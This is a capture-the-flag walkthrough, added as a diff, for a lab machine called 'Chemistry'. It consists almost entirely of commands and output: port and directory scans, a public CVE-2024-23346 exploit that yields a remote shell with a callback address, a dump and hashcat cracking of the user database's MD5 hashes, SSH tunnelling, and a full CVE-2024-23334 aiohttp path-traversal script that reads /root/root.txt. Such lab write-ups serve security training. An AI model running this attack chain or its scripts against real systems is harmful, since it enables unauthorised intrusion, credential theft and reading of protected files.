@@ -1,0 +1,215 @@
+----------
+Chemistry
+----------
+
+sudo nmap 10.129.231.170 -sCVS -p- --min-rate 5000
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-20 10:11 EST
+Nmap scan report for 10.129.231.170
+Host is up (0.0098s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
+|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
+|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
+5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
+|_http-title: Chemistry - Home
+|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+--------------------------------------------------------------------------------------------------------
+
+echo 10.129.231.170 chemistry.htb | sudo tee -a /etc/hosts
+--------------------------------------------------------------------------------------------------------
+
+gobuster dir -u http://chemistry.htb:5000 -w /usr/share/wordlists/dirb/common.txt -x txt,html,zip,php,py -t 20
+
+...
+/dashboard            (Status: 302) [Size: 235] [--> /login?next=%2Fdashboard]
+/login                (Status: 200) [Size: 926]
+/logout               (Status: 302) [Size: 229] [--> /login?next=%2Flogout]
+/register             (Status: 200) [Size: 931]
+/upload               (Status: 405) [Size: 153]
+Progress: 27684 / 27690 (99.98%)
+...
+--------------------------------------------------------------------------------------------------------
+
+clone https://github.com/MAWK0235/CVE-2024-23346.git
+Cloning into 'CVE-2024-23346'...
+remote: Enumerating objects: 36, done.
+remote: Counting objects: 100% (36/36), done.
+remote: Compressing objects: 100% (35/35), done.
+remote: Total 36 (delta 8), reused 0 (delta 0), pack-reused 0 (from 0)
+Receiving objects: 100% (36/36), 13.50 KiB | 13.50 MiB/s, done.
+Resolving deltas: 100% (8/8), done.
+---
+
+cd CVE-2024-23346/
+---
+
+python3 exploit.py -t chemistry.htb -u test -p test -l 10.10.14.39
+
+Preforming one time logon.....
+[*] executing command on chemistry.htb
+Terminal> id
+Received data: uid=1001(app) gid=1001(app) groups=1001(app)
+--------------------------------------------------------------------------------------------------------
+
+cat /etc/passwd
+---
+...
+rosa:x:1000:1000:rosa:/home/rosa:/bin/bash
+...
+---
+ss -ltnp
+
+State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process
+LISTEN    0         4096         127.0.0.53%lo:53               0.0.0.0:*
+LISTEN    0         128                0.0.0.0:22               0.0.0.0:*
+LISTEN    0         128                0.0.0.0:5000             0.0.0.0:*        users:(("ss",pid=1458,fd=4),("bash",pid=1448,fd=4),("bash",pid=1447,fd=4),("sh",pid=1446,fd=4),("sh",pid=1444,fd=4),("python3.9",pid=1040,fd=4))
+LISTEN    0         128              127.0.0.1:8080             0.0.0.0:*
+LISTEN    0         128                   [::]:22                  [::]:*
+---
+
+sqlite3 instanse/database.db
+---
+
+.tables
+---
+
+structure  user
+---
+
+select * from user;
+
+1|admin|2861debaf8d99436a10ed6f75a252abf
+2|app|197865e46b878d9e74a0346b6d59886a
+
+3|rosa|63ed86ee9f624c7b14f1d4f43dc251a5
+
+4|robert|02fcf7cfc10adc37959fb21f06c6b467
+5|jobert|3dec299e06f7ed187bac06bd3b670ab2
+6|carlos|9ad48828b0955513f7cf0f7f6510c8f8
+7|peter|6845c17d298d95aa942127bdad2ceb9b
+8|victoria|c3601ad2286a4293868ec2a4bc606ba3
+9|tania|a4aa55e816205dc0389591c9f82f43bb
+10|eusebio|6cad48078d0241cca9a7b322ecd073b3
+11|gelacia|4af70c80b68267012ecdac9a7e916d18
+12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
+13|axel|9347f9724ca083b17e39555c36fd9007
+14|kristel|6896ba7b11a62cacffbdaded457c6d92
+15|test|098f6bcd4621d373cade4e832627b4f6
+---
+
+echo 63ed86ee9f624c7b14f1d4f43dc251a5 > hash
+---
+
+cat hash | hashid
+
+Analyzing '63ed86ee9f624c7b14f1d4f43dc251a5'
+[+] MD2
+[+] MD5
+[+] MD4
+[+] Double MD5
+[+] LM
+[+] RIPEMD-128
+[+] Haval-128
+[+] Tiger-128
+[+] Skein-256(128)
+[+] Skein-512(128)
+[+] Lotus Notes/Domino 5
+[+] Skype
+[+] Snefru-128
+[+] NTLM
+[+] Domain Cached Credentials
+[+] Domain Cached Credentials 2
+[+] DNSSEC(NSEC3)
+[+] RAdmin v2.x
+---
+
+gzip -dc /usr/share/wordlists/rockyou.txt.gz > "$HOME/rockyou.txt"
+---
+
+hashcat -m 0 hash rockyou.txt
+---
+
+hashcat -m 0 --show hash
+63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
+----
+
+username: rosa
+password: unicorniosrosados
+----
+
+ssh -L 8080:127.0.0.1:8080 rosa@chemistry.htb
+
+rosa@chemistry:~$ cat user.txt
+
+f5459c3f59d7dd596d8d01e7825b27e5
+--------------------------------------------------------------------------------------------------------
+
+curl -I http://localhost:8080
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 5971
+Date: Mon, 23 Nov 2026 07:58:41 GMT
+Server: Python/3.9 aiohttp/3.9.1
+---
+
+feroxbuster -u http://127.0.0.1:8080 -w /usr/share/wordlists/dirb/common.txt
+...
+
+404      GET        1l        3w       14c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET        2l     1294w    89501c http://127.0.0.1:8080/assets/js/jquery-3.6.0.min.js
+200      GET       72l      171w     2491c http://127.0.0.1:8080/assets/js/script.js
+200      GET       88l      171w     1380c http://127.0.0.1:8080/assets/css/style.css
+200      GET        5l       83w    59344c http://127.0.0.1:8080/assets/css/all.min.css
+200      GET       20l     3036w   205637c http://127.0.0.1:8080/assets/js/chart.js
+200      GET      153l      407w     5971c http://127.0.0.1:8080/
+403      GET        1l        2w       14c http://127.0.0.1:8080/assets/js/
+403      GET        1l        2w       14c http://127.0.0.1:8080/assets/
+403      GET        1l        2w       14c http://127.0.0.1:8080/assets/css/
+403      GET        1l        2w       14c http://127.0.0.1:8080/assets
+403      GET        1l        2w       14c http://127.0.0.1:8080/assets/css
+403      GET        1l        2w       14c http://127.0.0.1:8080/assets/js
+---
+
+git clone https://github.com/z3rObyte/CVE-2024-23334-PoC.git
+
+change ./exploit.sh
+
+#!/bin/bash
+
+url="http://localhost:8080"
+string="../"
+payload="/assets/"
+file="/root/root.txt" # without the first /
+
+for ((i=0; i<15; i++)); do
+    payload+="$string"
+    echo "[+] Testing with $payload$file"
+    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
+    echo -e "\tStatus code --> $status_code"
+
+    if [[ $status_code -eq 200 ]]; then
+        curl -s --path-as-is "$url$payload$file"
+        break
+    fi
+done
+----
+
+./exploit.sh
+
+[+] Testing with /assets/..//root/root.txt
+	Status code --> 404
+[+] Testing with /assets/../..//root/root.txt
+	Status code --> 404
+[+] Testing with /assets/../../..//root/root.txt
+	Status code --> 200
+
+4e48824b01a8398ac8c107eba039c632
+
+
+
